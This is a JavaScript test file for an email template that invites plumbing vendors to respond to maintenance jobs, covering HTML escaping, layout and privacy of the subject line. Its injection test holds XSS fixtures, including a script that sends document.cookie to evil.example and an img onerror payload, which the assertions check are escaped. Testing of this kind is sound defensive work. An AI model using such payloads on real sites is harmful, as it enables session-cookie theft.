const assert = require("assert");
const {
  buildVendorOutreachEmail,
} = require("../../../services/notification/templates/vendorOutreachEmail");
const { escapeHtml } = require("../../../services/notification/templates/emailLayout");

const baseArgs = {
  vendorName: "Prairie Plumbing Partners",
  brief: {
    category: "Plumbing",
    city: "Regina",
    shortTitle: "Kitchen sink leaking under cabinet",
    summary: "Steady drip from the P-trap",
  },
  offeredWindows: [
    { slotId: "w-1", label: "Wed, Jul 29, 8:00 a.m. – 12:00 p.m." },
    { slotId: "w-2", label: "Thu, Jul 30, 1:00 p.m. – 5:00 p.m." },
  ],
  responseUrl: "http://localhost:3000/vendor-response/TESTTOKEN",
  responseDeadlineAt: new Date("2026-07-28T19:00:00.000Z"),
  tier: "normal",
  timeZone: "America/Regina",
  messageBody: "Artrelo is coordinating a maintenance request in Regina.",
  managerName: "Excel Ojeifo",
  managerCompany: "Northline Properties",
  expiresAt: new Date("2026-07-29T19:00:00.000Z"),
  photoCount: 3,
};

/* ---------------- 1) escapeHtml is total ---------------- */

assert.strictEqual(escapeHtml('<script>alert("x")</script>'), "&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;");
assert.strictEqual(escapeHtml("a & b"), "a &amp; b");
assert.strictEqual(escapeHtml("it's"), "it&#39;s");
assert.strictEqual(escapeHtml(null), "");
assert.strictEqual(escapeHtml(undefined), "");
assert.strictEqual(escapeHtml(0), "0");

/* ---------------- 2) A hostile draft cannot inject markup ---------------- */
// The draft is landlord-edited free text (up to 4000 chars) and reaches the
// template verbatim, so it is the highest-risk interpolation in the email.

const hostile = buildVendorOutreachEmail({
  ...baseArgs,
  vendorName: '<img src=x onerror="alert(1)">',
  messageBody: '</td></table><script>fetch("https://evil.example/"+document.cookie)</script>',
  managerCompany: '"><a href="https://evil.example">click</a>',
});

// The payload must survive only as inert, escaped text — never as real markup.
// (An escaped `onerror=` substring is harmless; what matters is that no
// unescaped tag delimiter reaches the document, so it can never be an attribute.)
assert.ok(!hostile.html.includes("<script>"), "script tags must be escaped out of the HTML");
assert.ok(!hostile.html.includes("<img"), "injected img tags must be escaped");
assert.ok(
  !hostile.html.includes('<a href="https://evil.example"'),
  "injected anchors must be escaped"
);
assert.ok(hostile.html.includes("&lt;script&gt;"), "the payload should appear escaped, not dropped");
assert.ok(hostile.html.includes("&lt;img"), "the img payload should appear escaped");

// Every anchor in the document must be one the template itself emitted.
const anchorHrefs = [...hostile.html.matchAll(/<a\s+href="([^"]*)"/g)].map((match) => match[1]);
anchorHrefs.forEach((href) => {
  assert.ok(!href.includes("evil.example"), `template emitted an attacker-controlled link: ${href}`);
});

// The subject line must not carry raw markup either.
assert.ok(!hostile.subject.includes("<"), "subject must be plain text");

/* ---------------- 3) Structure and email-client constraints -------------- */

const { subject, html, text, preheader } = buildVendorOutreachEmail(baseArgs);

assert.ok(html.includes('width="600"'), "must use a fixed 600px table");
assert.ok(html.includes("max-width:600px"), "must cap at 600px for narrow reading panes");
assert.ok(html.includes('role="presentation"'), "layout tables must be presentational");
assert.ok(html.includes("mso-hide:all"), "preheader must be hidden in Outlook too");
assert.ok(html.includes('name="color-scheme"'), "must declare color-scheme for dark mode");
assert.ok(html.includes('name="supported-color-schemes"'));
assert.ok(html.includes('bgcolor="#ffffff"'), "cells need bgcolor so Gmail's inverter behaves");

// No layout techniques email clients drop.
assert.ok(!/display:\s*flex/i.test(html), "flexbox is not supported in email");
assert.ok(!/display:\s*grid/i.test(html), "grid is not supported in email");
assert.ok(!/<link[^>]+stylesheet/i.test(html), "no external stylesheets");

// The CTA points at the magic link.
assert.ok(html.includes(baseArgs.responseUrl), "HTML must contain the response URL");

/* ---------------- 4) Plain-text alternative is present and complete ------ */

assert.ok(text && text.length > 0, "a plain-text part is mandatory");
assert.ok(text.includes(baseArgs.responseUrl), "text part must carry the bare URL");
assert.ok(!text.includes("<"), "text part must not contain markup");
assert.ok(
  !text.includes("This is a draft only and has not been sent."),
  "the draft-only disclaimer must be stripped from a real send"
);
baseArgs.offeredWindows.forEach((slot) => {
  assert.ok(text.includes(slot.label), `text part should list window: ${slot.label}`);
});

/* ---------------- 5) Subject / preheader leak nothing ---------------- */

const leaky = buildVendorOutreachEmail({
  ...baseArgs,
  brief: { ...baseArgs.brief, shortTitle: "Leak at 8842 Zephyrhill Crescent Unit 3071B" },
});

// The subject is built from category + city + tier only — never the title.
assert.ok(!leaky.subject.includes("8842"), "subject must not carry a street address");
assert.ok(!leaky.subject.includes("3071B"), "subject must not carry a unit number");
assert.ok(!leaky.preheader.includes("8842"), "preheader must not carry a street address");
assert.ok(!leaky.preheader.includes("3071B"), "preheader must not carry a unit number");

assert.ok(subject.includes("Plumbing"), "subject should name the trade");
assert.ok(subject.includes("Regina"), "subject should name the city");
assert.ok(preheader.includes("Regina"));

/* ---------------- 6) Tier badges ---------------- */

const emergency = buildVendorOutreachEmail({ ...baseArgs, tier: "emergency" });
assert.ok(emergency.subject.includes("Emergency"));
assert.ok(emergency.html.includes("EMERGENCY") || emergency.html.includes("Emergency"));

const low = buildVendorOutreachEmail({ ...baseArgs, tier: "low" });
assert.ok(low.subject.includes("Low priority"));

/* ---------------- 7) Degrades gracefully with missing data ---------------- */

const sparse = buildVendorOutreachEmail({
  vendorName: "Someone",
  brief: {},
  offeredWindows: [],
  responseUrl: "http://localhost:3000/vendor-response/T",
  responseDeadlineAt: null,
  expiresAt: null,
});
assert.ok(sparse.html.length > 0);
assert.ok(sparse.text.length > 0);
assert.ok(sparse.subject.length > 0);

/* ---------------- 8) Layout: each fact once, in reading order ------------ */
// The message used to sit BELOW the windows while saying they were "listed
// below", rendered with pre-line (indented lines, stray gaps), under a header
// that already greeted the vendor.

const note = [
  "We have a plumbing job in Regina: Leak under the kitchen sink.",
  "   Your past plumbing jobs with us have averaged $250.", // landlord-edited indent
  "",
  "",
  "When you respond, pick the time window that suits you and confirm your price.",
].join("\n");
const laidOut = buildVendorOutreachEmail({ ...baseArgs, messageBody: note });

const at = (needle) => laidOut.html.indexOf(needle);
assert.ok(at("Message from Excel Ojeifo") > 0, "the note is labelled with who wrote it");
assert.ok(at("Message from") < at("Choose a time window"), "message before the windows");
assert.ok(at("Choose a time window") < at(baseArgs.offeredWindows[0].label), "windows under their label");
assert.ok(at(baseArgs.offeredWindows[1].label) < at(baseArgs.responseUrl), "windows before the button");
assert.ok(!/pre-line/.test(laidOut.html), "paragraphs, not a pre-line blob");
assert.strictEqual((laidOut.html.match(/<p style="margin:0 0 10px 0;/g) || []).length, 1, "two paragraphs: the first spaced, the last flush");
assert.ok(laidOut.html.includes("Leak under the kitchen sink.<br>Your past plumbing jobs"), "a single newline stays a line break, its indent dropped");
assert.ok(!laidOut.html.includes("•"), "no bullets");
assert.ok(!/>\s*Urgency\s*</.test(laidOut.html), "urgency is the chip, not a row");
assert.ok(!/>\s*Property manager\s*</.test(laidOut.html), "no property manager row");
assert.ok((laidOut.html.match(/Hello/g) || []).length === 0, "the header greets by name without a second Hello");

const textLines = laidOut.text.split("\n");
assert.ok(textLines.every((line) => !/^[ \t]/.test(line)), "no indented lines in the text part");
assert.ok(!/\n\n\n/.test(laidOut.text), "never more than one blank line");
assert.ok(laidOut.text.indexOf("Message from") < laidOut.text.indexOf("Choose a time window:"));
assert.ok(laidOut.text.includes(`- ${baseArgs.offeredWindows[0].label}`), "windows as flush dashes");

// en-CA times end in "p.m." -- never followed by a second period.
for (const part of [laidOut.html, laidOut.text, laidOut.preheader]) {
  assert.ok(!/m\.\.(?!\.)/.test(part), "no doubled period after a.m./p.m.");
  assert.ok(!/m\.<\/strong>\./.test(part), "no doubled period after a bolded time");
}

// The tenant's time preference sits with the job facts, before the windows.
const preferring = buildVendorOutreachEmail({
  ...baseArgs,
  brief: { ...baseArgs.brief, preferredTimes: ["Weekday mornings"] },
});
assert.ok(preferring.html.indexOf("Tenant prefers") < preferring.html.indexOf("Choose a time window"));
assert.ok(preferring.html.includes("Weekday mornings"));
assert.ok(preferring.text.includes("Tenant prefers: Weekday mornings"));
assert.ok(!laidOut.html.includes("Tenant prefers"), "no row when the tenant gave no preference");

// No message: no empty card.
const silent = buildVendorOutreachEmail({ ...baseArgs, messageBody: "   " });
assert.ok(!silent.html.includes("Message from"));

console.log("vendorOutreachEmail template tests passed");
